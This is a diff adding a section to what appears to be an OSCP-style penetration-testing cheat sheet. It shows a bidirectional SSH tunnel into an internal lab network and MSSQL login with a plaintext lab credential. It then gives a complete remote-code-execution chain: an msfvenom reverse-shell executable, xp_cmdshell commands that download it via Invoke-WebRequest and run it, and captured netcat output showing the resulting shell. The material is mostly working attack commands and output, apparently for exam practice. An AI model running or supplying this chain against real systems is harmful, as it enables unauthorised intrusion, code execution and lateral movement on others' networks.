@@ -2134,6 +2134,63 @@ ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N
 ````
 sqsh -S 127.0.0.1 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb
 ````
+#### Bi-directional ssh tunnel
+````
+In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_svc creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
+````
+##### Local Port Foward
+````
+Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Administrator@192.168.236.147: Specifies the username (Administrator) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
+````
+````
+ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N
+````
+````
+In our next command we are able to login as the sql_svc on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
+````
+````
+sqsh -S 127.0.0.1 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb
+````
+##### Reverse Port Foward
+````
+-R 10.10.126.147:7781:192.168.45.191:18890: Sets up reverse port forwarding. It instructs SSH to listen on IP 10.10.126.147 and port 7781 on the remote server, and any incoming traffic received on this port should be forwarded to the IP 192.168.45.191 and port 18890.
+administrator@192.168.236.147: Specifies the username (administrator) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
+````
+````
+sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 administrator@192.168.236.147 -N
+````
+##### RCE
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=7781 EXITFUNC=thread -f exe --platform windows -o rshell.exe
+````
+````
+1> xp_cmdshell 'whoami'
+nt service\mssql$sqlexpress
+````
+````
+1> xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
+````
+````
+python3 -m http.server 18890
+Serving HTTP on 0.0.0.0 port 18890 (http://0.0.0.0:18890/) ...
+192.168.45.191 - - [30/May/2023 22:05:32] "GET /rshell.exe HTTP/1.1" 200 -
+````
+````
+1> xp_cmdshell 'c:\Users\Public\reverse.exe"'
+````
+````
+nc -nlvp 18890
+retrying local 0.0.0.0:18890 : Address already in use
+retrying local 0.0.0.0:18890 : Address already in use
+listening on [any] 18890 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.45.191] 37446
+Microsoft Windows [Version 10.0.19042.1586]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt service\mssql$sqlexpress
+````
 #### Chisel
 ````
 https://github.com/jpillora/chisel/releases/ #where you can find newer versions
